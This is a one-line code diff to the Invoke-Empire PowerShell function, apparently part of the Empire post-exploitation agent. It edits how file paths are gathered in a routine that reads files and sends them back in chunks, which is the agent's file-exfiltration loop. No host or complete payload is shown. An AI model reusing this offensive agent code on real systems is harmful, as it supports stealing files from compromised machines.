@@ -845,7 +845,7 @@ function Invoke-Empire {
                     }
 
                     # resolve the complete paths
-                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName}
+                    $Path = Get-Childitem -Recurse $Path | ForEach-Object {$_.FullName}
 
                     foreach ( $File in $Path) {
                         # read in and send the specified chunk size back for as long as the file has more parts
